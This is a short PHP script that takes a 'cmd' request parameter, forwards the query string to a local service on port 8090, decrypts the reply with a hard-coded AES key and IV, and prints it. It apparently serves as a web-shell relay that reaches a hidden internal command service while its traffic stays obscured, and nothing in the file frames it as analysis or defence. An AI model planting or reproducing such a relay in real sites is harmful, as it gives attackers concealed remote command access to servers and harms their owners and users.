<?php
$key = 'qwertyuiopqwieuu';
$iv = '0123456789123456';
$enableEncrypt=true;
$url="http://127.0.0.1:8090/";

if(isset($_REQUEST['cmd'])) {
	//$url=$url."?".encrypt($_SERVER['QUERY_STRING']);
	$url=$url."?".$_SERVER['QUERY_STRING'];
	$data=trim(file_get_contents($url));

	if($enableEncrypt) {
		$data=decrypt($data, $key, $iv);
	}
	
	header("Content-Type: text/html");
	echo "<pre>";
	echo $data;
	echo "</pre>";
} else {
	echo "CMD Not Found";
}

function encrypt($data, $key, $iv) {
    $blocksize = 16;
    $pad = $blocksize - (strlen($data) % $blocksize);
    $data = $data . str_repeat(chr($pad), $pad);
    return bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC, $iv));
}
function decrypt($data, $key, $iv) {
    return mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, hex2bin($data), MCRYPT_MODE_CBC, $iv);
}
?>
